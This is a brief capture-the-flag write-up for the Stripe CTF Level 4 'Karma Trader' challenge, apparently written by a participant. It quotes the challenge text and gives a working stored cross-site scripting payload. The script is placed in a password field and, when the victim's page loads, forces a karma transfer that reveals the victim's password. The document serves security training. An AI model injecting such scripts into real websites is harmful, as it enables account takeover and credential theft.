The Karma Trader is the world's best way to reward people for good deeds: https://level04-2.stripe-ctf.com/user-XXXXXXXXXX. You can sign up for an account, and start transferring karma to people who you think are doing good in the world. In order to ensure you're transferring karma only to good people, transferring karma to a user will also reveal your password to him or her.

The very active user karma_fountain has infinite karma, making it a ripe account to obtain (no one will notice a few extra karma trades here and there). The password for karma_fountain's account will give you access to Level 5.

You can obtain the full, runnable source for the Karma Trader from git clone https://level04-2.stripe-ctf.com/user-XXXXXXXXXX/level04-code. We've included the most important files below. 


**My solution:**

<script>document.getElementsByName("to").item(0).value="me"; document.getElementsByName("amount").item(0).value="10"; document.getElementsByName("amount").item(0).parentNode.parentNode.submit(); alert("itworked"); </script> in the password field of second account, and transfer to karma_fountain; karma_fountain logs in and javascript gets executed via password field: karma transferred from karma_fountain to me; I log in as me and see karma_fountains password
